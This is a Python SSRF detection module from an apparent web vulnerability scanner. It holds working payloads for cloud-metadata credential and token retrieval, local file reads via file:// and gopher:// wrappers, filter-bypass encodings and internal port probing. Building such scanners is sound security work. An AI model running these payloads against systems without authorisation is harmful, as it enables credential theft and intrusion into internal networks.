#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Detection Module
====================================================
Based on 2025 techniques including:
- Cloud metadata endpoint access
- Internal service discovery
- DNS rebinding preparation
- Protocol smuggling via SSRF
- Blind SSRF via timing/DNS

References:
- AWS/GCP/Azure metadata exploitation
- SSRF to RCE chains
"""

import re
import time
import random
import string
import socket
from typing import List, Optional, Dict
from urllib.parse import urlparse, quote, urlencode

from .base import TechniqueScanner, Finding, ScanProgress, is_shutdown


class SSRFDetection(TechniqueScanner):
    """Server-Side Request Forgery vulnerability scanner"""

    TECHNIQUE_NAME = "ssrf"
    TECHNIQUE_CATEGORY = "server_side"

    # Cloud metadata endpoints
    CLOUD_METADATA = [
        # AWS
        {
            "name": "AWS Metadata v1",
            "url": "http://169.254.169.254/latest/meta-data/",
            "indicators": ["ami-id", "instance-id", "local-hostname"]
        },
        {
            "name": "AWS Metadata v2",
            "url": "http://169.254.169.254/latest/api/token",
            "indicators": ["Token", "X-aws"]
        },
        {
            "name": "AWS IMDSv1 Credentials",
            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "indicators": ["AccessKeyId", "SecretAccessKey"]
        },
        # GCP
        {
            "name": "GCP Metadata",
            "url": "http://metadata.google.internal/computeMetadata/v1/",
            "headers": {"Metadata-Flavor": "Google"},
            "indicators": ["project", "instance", "attributes"]
        },
        {
            "name": "GCP Service Account Token",
            "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "headers": {"Metadata-Flavor": "Google"},
            "indicators": ["access_token", "token_type"]
        },
        # Azure
        {
            "name": "Azure Metadata",
            "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "headers": {"Metadata": "true"},
            "indicators": ["compute", "network", "subscriptionId"]
        },
        {
            "name": "Azure Identity Token",
            "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "headers": {"Metadata": "true"},
            "indicators": ["access_token", "client_id"]
        },
        # DigitalOcean
        {
            "name": "DigitalOcean Metadata",
            "url": "http://169.254.169.254/metadata/v1/",
            "indicators": ["droplet_id", "hostname", "region"]
        },
        # Alibaba Cloud
        {
            "name": "Alibaba Metadata",
            "url": "http://100.100.100.200/latest/meta-data/",
            "indicators": ["instance-id", "region-id"]
        },
        # Oracle Cloud
        {
            "name": "Oracle Cloud Metadata",
            "url": "http://169.254.169.254/opc/v1/instance/",
            "indicators": ["displayName", "compartmentId"]
        },
    ]

    # Internal network targets
    INTERNAL_TARGETS = [
        # Localhost variations
        "http://127.0.0.1/",
        "http://localhost/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://127.1/",
        "http://127.0.1/",
        "http://2130706433/",  # Decimal IP
        "http://0x7f000001/",  # Hex IP
        "http://017700000001/",  # Octal IP
        "http://0177.0.0.1/",  # Mixed octal
        # Common internal services
        "http://192.168.1.1/",
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        # Docker
        "http://host.docker.internal/",
        "http://172.17.0.1/",
        # Kubernetes
        "http://kubernetes.default.svc/",
        "http://kubernetes.default/",
    ]

    # Common internal ports
    INTERNAL_PORTS = [
        (80, "HTTP"),
        (443, "HTTPS"),
        (8080, "HTTP Alt"),
        (8443, "HTTPS Alt"),
        (3000, "Node.js"),
        (5000, "Flask"),
        (6379, "Redis"),
        (27017, "MongoDB"),
        (5432, "PostgreSQL"),
        (3306, "MySQL"),
        (9200, "Elasticsearch"),
        (8500, "Consul"),
        (2379, "etcd"),
        (11211, "Memcached"),
        (9000, "PHP-FPM"),
        (4443, "Internal HTTPS"),
    ]

    # URL parameter names that might be vulnerable
    SSRF_PARAMS = [
        "url", "uri", "path", "dest", "redirect", "target",
        "rurl", "domain", "feed", "host", "site", "html",
        "load", "src", "source", "data", "file", "document",
        "folder", "root", "pg", "style", "pdf", "doc", "img",
        "image", "fetch", "proxy", "callback", "endpoint",
        "api", "link", "ref", "return", "next", "webhook",
    ]

    # Protocol wrappers to test
    PROTOCOL_WRAPPERS = [
        ("file:///etc/passwd", "file_read"),
        ("file:///c:/windows/win.ini", "file_read_windows"),
        ("dict://127.0.0.1:6379/INFO", "redis_dict"),
        ("gopher://127.0.0.1:6379/_INFO", "redis_gopher"),
        ("ftp://127.0.0.1/", "ftp"),
        ("ldap://127.0.0.1/", "ldap"),
        ("sftp://127.0.0.1/", "sftp"),
    ]

    # Bypass techniques
    BYPASS_TECHNIQUES = [
        # URL encoding
        ("http://127.0.0.1/", "http://%31%32%37%2e%30%2e%30%2e%31/", "url_encode"),
        # Double URL encoding
        ("http://127.0.0.1/", "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/", "double_encode"),
        # IPv6 localhost
        ("http://127.0.0.1/", "http://[::ffff:127.0.0.1]/", "ipv6_mapped"),
        # Decimal IP
        ("http://127.0.0.1/", "http://2130706433/", "decimal_ip"),
        # Octal IP
        ("http://127.0.0.1/", "http://0177.0.0.1/", "octal_ip"),
        # Short form
        ("http://127.0.0.1/", "http://127.1/", "short_ip"),
        # CNAME/DNS rebind preparation
        ("http://127.0.0.1/", "http://localtest.me/", "dns_localhost"),
        ("http://127.0.0.1/", "http://127.0.0.1.nip.io/", "nip_io"),
        # With credentials
        ("http://127.0.0.1/", "http://google.com@127.0.0.1/", "url_credentials"),
        # Fragment
        ("http://127.0.0.1/", "http://evil.com#@127.0.0.1/", "fragment_bypass"),
    ]

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.canary = self._generate_canary()

    def _generate_canary(self) -> str:
        return 'ssrf' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

    def _find_ssrf_endpoints(self, domain: str) -> List[Dict]:
        """Find endpoints that might be vulnerable to SSRF"""
        endpoints = []

        # Common SSRF-vulnerable endpoints
        test_paths = [
            "/api/fetch",
            "/api/proxy",
            "/api/url",
            "/api/image",
            "/api/screenshot",
            "/api/pdf",
            "/api/import",
            "/api/export",
            "/api/webhook",
            "/api/callback",
            "/proxy",
            "/fetch",
            "/load",
            "/image",
            "/pdf",
            "/webhook",
            "/preview",
            "/render",
        ]

        for path in test_paths:
            if is_shutdown():
                break

            url = f"https://{domain}{path}"

            # Test GET with URL parameter
            for param in self.SSRF_PARAMS[:5]:
                test_url = f"{url}?{param}=https://example.com"
                resp = self.get(test_url, allow_redirects=False)

                if resp and resp.status_code in [200, 301, 302, 400, 403, 500]:
                    endpoints.append({
                        "url": url,
                        "path": path,
                        "param": param,
                        "method": "GET",
                        "status": resp.status_code
                    })
                    break

            # Test POST
            resp_post = self.post(url, data={"url": "https://example.com"}, allow_redirects=False)
            if resp_post and resp_post.status_code in [200, 400, 500]:
                endpoints.append({
                    "url": url,
                    "path": path,
                    "param": "url",
                    "method": "POST",
                    "status": resp_post.status_code
                })

        return endpoints

    def _test_cloud_metadata(self, domain: str, endpoint: Dict) -> List[Dict]:
        """Test for cloud metadata access via SSRF"""
        findings = []
        url = endpoint["url"]
        param = endpoint["param"]
        method = endpoint["method"]

        for metadata in self.CLOUD_METADATA:
            if is_shutdown():
                break

            target_url = metadata["url"]

            if method == "GET":
                test_url = f"{url}?{param}={quote(target_url)}"
                resp = self.get(test_url, allow_redirects=True)
            else:
                resp = self.post(url, data={param: target_url}, allow_redirects=True)

            if resp is None:
                continue

            # Strong evidence gating for cloud metadata
            # 1. Check Content-Type - metadata returns text/plain or JSON, NOT text/html
            content_type = resp.headers.get('Content-Type', '').lower()
            is_html_page = 'text/html' in content_type or '<html' in resp.text.lower()[:500]

            # If response is HTML, it's almost certainly a normal web page, not metadata
            if is_html_page:
                continue

            # 2. Check response structure matches expected metadata format
            response_text = resp.text.lower()

            # Count how many indicators are present
            indicators_found = []
            for indicator in metadata["indicators"]:
                if indicator.lower() in response_text:
                    indicators_found.append(indicator)

            # 3. Require multiple indicators AND non-HTML response for high confidence
            if len(indicators_found) >= 2 and not is_html_page:
                # Additional validation: check response looks like actual metadata
                # AWS metadata is newline-separated, GCP/Azure are JSON
                looks_like_metadata = (
                    ('json' in content_type and ('{' in resp.text or '[' in resp.text)) or
                    ('text/plain' in content_type) or
                    (resp.text.strip().count('\n') > 2 and '<' not in resp.text[:100])  # Multi-line text without HTML
                )

                if looks_like_metadata:
                    findings.append({
                        "type": "cloud_metadata",
                        "cloud": metadata["name"],
                        "target": target_url,
                        "endpoint": url,
                        "method": method,
                        "response_obj": resp,
                        "evidence": f"Cloud metadata accessible: {metadata['name']} - found indicators: {indicators_found}"
                    })

        return findings

    def _test_internal_access(self, domain: str, endpoint: Dict) -> List[Dict]:
        """Test for internal network access via SSRF"""
        findings = []
        url = endpoint["url"]
        param = endpoint["param"]
        method = endpoint["method"]

        # Get baseline response for comparison
        baseline_url = "https://example.com"
        if method == "GET":
            baseline_resp = self.get(f"{url}?{param}={baseline_url}", allow_redirects=True)
        else:
            baseline_resp = self.post(url, data={param: baseline_url}, allow_redirects=True)

        if baseline_resp is None:
            return findings

        baseline_len = len(baseline_resp.text)
        baseline_time = baseline_resp.elapsed.total_seconds()

        for target in self.INTERNAL_TARGETS[:10]:  # Limit for efficiency
            if is_shutdown():
                break

            if method == "GET":
                test_url = f"{url}?{param}={quote(target)}"
                resp = self.get(test_url, allow_redirects=True)
            else:
                resp = self.post(url, data={param: target}, allow_redirects=True)

            if resp is None:
                continue

            # Check response content for internal access indicators
            resp_text = resp.text.lower()
            content_type = resp.headers.get('Content-Type', '').lower()
            is_html_page = 'text/html' in content_type or '<html' in resp_text[:500]

            # IMPORTANT: Length difference alone is NOT sufficient evidence
            # We need actual internal content indicators

            # Strong indicators of actual internal access (not just any HTML page)
            internal_indicators = []

            # Check for actual internal service responses
            if 'nginx' in resp_text[:200] and 'welcome to nginx' in resp_text.lower():
                internal_indicators.append("nginx_default_page")
            if 'apache' in resp_text[:500] and ('it works' in resp_text.lower() or 'test page' in resp_text.lower()):
                internal_indicators.append("apache_default_page")
            if 'directory listing' in resp_text.lower() or 'index of /' in resp_text.lower():
                internal_indicators.append("directory_listing")

            # Check for service-specific responses (non-HTML)
            if not is_html_page:
                if 'redis_version' in resp_text or 'connected_clients' in resp_text:
                    internal_indicators.append("redis_service")
                if 'mongodb' in resp_text.lower() and 'errmsg' in resp_text.lower():
                    internal_indicators.append("mongodb_service")
                if 'elasticsearch' in resp_text.lower() or '"cluster_name"' in resp_text:
                    internal_indicators.append("elasticsearch_service")
                if 'postgresql' in resp_text.lower() or 'pgadmin' in resp_text.lower():
                    internal_indicators.append("postgresql_service")

            # Only report if we have concrete internal content evidence
            if internal_indicators:
                findings.append({
                    "type": "internal_access",
                    "target": target,
                    "endpoint": url,
                    "method": method,
                    "response_obj": resp,
                    "internal_indicators": internal_indicators,
                    "evidence": f"Internal service access detected: {', '.join(internal_indicators)}"
                })

            # Timing anomalies: only report SIGNIFICANT timing differences (>5s) with multiple confirmations
            # Single timing differences can be caused by network variance
            resp_time = resp.elapsed.total_seconds()
            # Note: Removed weak timing-only detection - timing alone is not reliable SSRF evidence

        return findings

    def _test_protocol_wrappers(self, domain: str, endpoint: Dict) -> List[Dict]:
        """Test for protocol wrapper access"""
        findings = []
        url = endpoint["url"]
        param = endpoint["param"]
        method = endpoint["method"]

        for wrapper, wrapper_type in self.PROTOCOL_WRAPPERS:
            if is_shutdown():
                break

            if method == "GET":
                test_url = f"{url}?{param}={quote(wrapper)}"
                resp = self.get(test_url, allow_redirects=False)
            else:
                resp = self.post(url, data={param: wrapper}, allow_redirects=False)

            if resp is None:
                continue

            response_text = resp.text.lower()

            # Check for file read indicators
            if wrapper_type.startswith("file"):
                if any(ind in response_text for ind in ["root:", "bin:", "[fonts]", "[extensions]"]):
                    findings.append({
                        "type": "file_read",
                        "wrapper": wrapper,
                        "endpoint": url,
                        "method": method,
                        "response_obj": resp,
                        "evidence": f"Local file read via {wrapper}"
                    })

            # Check for Redis/service indicators
            elif "redis" in wrapper_type:
                if any(ind in response_text for ind in ["redis_version", "connected_clients", "used_memory"]):
                    findings.append({
                        "type": "redis_access",
                        "wrapper": wrapper,
                        "endpoint": url,
                        "method": method,
                        "response_obj": resp,
                        "evidence": f"Redis access via {wrapper_type}"
                    })

        return findings

    def _test_bypass_techniques(self, domain: str, endpoint: Dict) -> List[Dict]:
        """Test various SSRF bypass techniques"""
        findings = []
        url = endpoint["url"]
        param = endpoint["param"]
        method = endpoint["method"]

        for original, bypass, bypass_type in self.BYPASS_TECHNIQUES:
            if is_shutdown():
                break

            if method == "GET":
                test_url = f"{url}?{param}={quote(bypass, safe='')}"
                resp = self.get(test_url, allow_redirects=True)
            else:
                resp = self.post(url, data={param: bypass}, allow_redirects=True)

            if resp is None:
                continue

            # STRONG EVIDENCE REQUIRED for bypass detection
            # Just finding "localhost" or "admin" in an HTML page is NOT evidence
            # Normal retail sites contain these words in their pages

            content_type = resp.headers.get('Content-Type', '').lower()
            is_html_page = 'text/html' in content_type or '<html' in resp.text.lower()[:500]

            # If response is a normal HTML page, it's likely just the target site's error/default page
            # We need evidence of actual internal content access

            if resp.status_code == 200:
                response_lower = resp.text.lower()

                # Only flag if response is NOT an HTML page AND contains internal indicators
                # OR if we see very specific internal service signatures
                bypass_evidence = []

                if not is_html_page:
                    # Non-HTML responses with internal data are more credible
                    if 'root:' in response_lower or 'bin/' in response_lower:
                        bypass_evidence.append("file_content")
                    if 'redis_version' in response_lower:
                        bypass_evidence.append("redis_access")
                    if '"cluster_name"' in resp.text or '"elasticsearch"' in response_lower:
                        bypass_evidence.append("elasticsearch_access")
                    if any(ind in response_lower for ind in ['ami-id', 'instance-id', 'meta-data']):
                        bypass_evidence.append("metadata_access")

                # For HTML responses, only flag if we see default server pages
                # (not just because the page mentions "localhost" in text)
                if is_html_page:
                    if 'welcome to nginx' in response_lower and 'nginx' in response_lower[:500]:
                        bypass_evidence.append("nginx_default")
                    if 'apache' in response_lower[:500] and 'it works' in response_lower:
                        bypass_evidence.append("apache_default")
                    if 'directory listing' in response_lower or 'index of /' in response_lower:
                        bypass_evidence.append("directory_listing")

                if bypass_evidence:
                    findings.append({
                        "type": "bypass_success",
                        "bypass_type": bypass_type,
                        "payload": bypass,
                        "endpoint": url,
                        "method": method,
                        "response_obj": resp,
                        "evidence": f"SSRF bypass via {bypass_type}: {', '.join(bypass_evidence)}"
                    })

        return findings

    def _test_port_scan(self, domain: str, endpoint: Dict) -> List[Dict]:
        """Test for internal port scanning via SSRF"""
        findings = []
        url = endpoint["url"]
        param = endpoint["param"]
        method = endpoint["method"]

        open_ports = []

        for port, service in self.INTERNAL_PORTS[:8]:  # Limit scan
            if is_shutdown():
                break

            target = f"http://127.0.0.1:{port}/"

            if method == "GET":
                test_url = f"{url}?{param}={quote(target)}"
                start = time.time()
                resp = self.get(test_url, allow_redirects=True, timeout=5)
                resp_time = time.time() - start
            else:
                start = time.time()
                resp = self.post(url, data={param: target}, allow_redirects=True, timeout=5)
                resp_time = time.time() - start

            if resp is None:
                continue

            # Open port indicators
            if resp.status_code == 200 and len(resp.text) > 50:
                open_ports.append((port, service, resp_time))

        if len(open_ports) >= 2:
            findings.append({
                "type": "port_scan",
                "open_ports": open_ports,
                "endpoint": url,
                "method": method,
                "response_obj": resp,
                "evidence": f"Internal port scan possible: {[f'{p}({s})' for p, s, _ in open_ports]}"
            })

        return findings

    def scan(self, domain: str, progress: ScanProgress) -> List[Finding]:
        """Scan domain for SSRF vulnerabilities"""
        findings = []
        self.log(f"Testing SSRF on {domain}")

        # Find SSRF endpoints
        self.log("Finding potential SSRF endpoints")
        endpoints = self._find_ssrf_endpoints(domain)

        if endpoints:
            self.log(f"Found {len(endpoints)} potential SSRF endpoints", "success")

            for ep in endpoints:
                finding = self.create_finding(
                    domain=domain,
                    severity="info",
                    title=f"Potential SSRF Endpoint: {ep['path']}",
                    description=f"Endpoint accepts URL parameter",
                    evidence=f"Parameter: {ep['param']}, Method: {ep['method']}",
                    reproduction_steps=[
                        f"URL: {ep['url']}",
                        f"Parameter: {ep['param']}"
                    ],
                    sub_technique="ssrf_discovery",
                    endpoint=ep["url"],
                    parameter=ep["param"],
                    http_method=ep["method"]
                )
                findings.append(finding)
                progress.add_finding(domain, finding)

                # Test cloud metadata
                if not is_shutdown():
                    self.log(f"Testing cloud metadata on {ep['path']}")
                    meta_findings = self._test_cloud_metadata(domain, ep)

                    for mf in meta_findings:
                        finding = self.create_finding(
                            domain=domain,
                            severity="critical",
                            title=f"SSRF: Cloud Metadata Access ({mf['cloud']})",
                            description=f"Can access cloud provider metadata via SSRF",
                            evidence=mf["evidence"],
                            reproduction_steps=[
                                f"Endpoint: {mf['endpoint']}",
                                f"Target: {mf['target']}"
                            ],
                            response_obj=mf.get("response_obj"),
                            sub_technique="ssrf_cloud_metadata",
                            endpoint=mf["endpoint"],
                            parameter=ep["param"],
                            http_method=mf.get("method")
                        )
                        findings.append(finding)
                        progress.add_finding(domain, finding)

                # Test internal access
                if not is_shutdown():
                    self.log(f"Testing internal access on {ep['path']}")
                    internal_findings = self._test_internal_access(domain, ep)

                    for inf in internal_findings:
                        severity = "high" if inf["type"] == "internal_access" else "medium"
                        finding = self.create_finding(
                            domain=domain,
                            severity=severity,
                            title=f"SSRF: {inf['type'].replace('_', ' ').title()}",
                            description=f"Potential internal network access",
                            evidence=inf["evidence"],
                            reproduction_steps=[
                                f"Endpoint: {inf['endpoint']}",
                                f"Target: {inf['target']}"
                            ],
                            response_obj=inf.get("response_obj"),
                            sub_technique="ssrf_internal_access",
                            endpoint=inf["endpoint"],
                            parameter=ep["param"],
                            http_method=inf.get("method")
                        )
                        findings.append(finding)
                        progress.add_finding(domain, finding)

                # Test protocol wrappers
                if not is_shutdown():
                    self.log(f"Testing protocol wrappers on {ep['path']}")
                    proto_findings = self._test_protocol_wrappers(domain, ep)

                    for pf in proto_findings:
                        finding = self.create_finding(
                            domain=domain,
                            severity="critical",
                            title=f"SSRF: {pf['type'].replace('_', ' ').title()}",
                            description=f"Protocol wrapper exploitation",
                            evidence=pf["evidence"],
                            reproduction_steps=[
                                f"Endpoint: {pf['endpoint']}",
                                f"Wrapper: {pf['wrapper']}"
                            ],
                            response_obj=pf.get("response_obj"),
                            sub_technique="ssrf_protocol_wrapper",
                            endpoint=pf["endpoint"],
                            http_method=pf.get("method")
                        )
                        findings.append(finding)
                        progress.add_finding(domain, finding)

                # Test bypass techniques
                if not is_shutdown():
                    self.log(f"Testing SSRF bypasses on {ep['path']}")
                    bypass_findings = self._test_bypass_techniques(domain, ep)

                    for bf in bypass_findings:
                        finding = self.create_finding(
                            domain=domain,
                            severity="high",
                            title=f"SSRF Bypass: {bf['bypass_type']}",
                            description=f"SSRF filter bypass successful",
                            evidence=bf["evidence"],
                            reproduction_steps=[
                                f"Endpoint: {bf['endpoint']}",
                                f"Payload: {bf['payload']}"
                            ],
                            response_obj=bf.get("response_obj"),
                            sub_technique="ssrf_bypass",
                            endpoint=bf["endpoint"],
                            payload=bf["payload"],
                            http_method=bf.get("method")
                        )
                        findings.append(finding)
                        progress.add_finding(domain, finding)

                # Test port scanning
                if not is_shutdown():
                    self.log(f"Testing internal port scan via {ep['path']}")
                    port_findings = self._test_port_scan(domain, ep)

                    for portf in port_findings:
                        finding = self.create_finding(
                            domain=domain,
                            severity="medium",
                            title="SSRF: Internal Port Scanning",
                            description="Can enumerate internal ports via SSRF",
                            evidence=portf["evidence"],
                            reproduction_steps=[
                                f"Endpoint: {portf['endpoint']}",
                                f"Open ports detected: {portf['open_ports']}"
                            ],
                            response_obj=portf.get("response_obj"),
                            sub_technique="ssrf_port_scan",
                            endpoint=portf["endpoint"],
                            http_method=portf.get("method")
                        )
                        findings.append(finding)
                        progress.add_finding(domain, finding)

        self.log(f"Completed: {len(findings)} SSRF issues found", "success" if findings else "info")
        return findings
